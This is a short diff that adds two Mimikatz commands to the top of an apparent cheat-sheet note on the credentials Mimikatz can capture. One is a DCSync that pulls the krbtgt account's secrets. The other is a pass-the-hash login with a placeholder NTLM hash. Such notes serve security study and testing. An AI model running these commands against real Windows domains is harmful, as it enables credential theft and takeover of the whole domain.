@@ -1,3 +1,11 @@
+```
+lsadump::dcsync /domain:complyedge.com /user:krbtgt
+```
+
+```
+sekurlsa::pth /user:jeff /domain:corp.com /ntlm:NTLMHASHnhb
+```
+
 # 🛠️ Mimikatz: Credentials It Can Capture
 
 Mimikatz is a powerful tool for extracting credentials from Windows systems. Below is a breakdown of credential types it can capture, along with methods and formats.
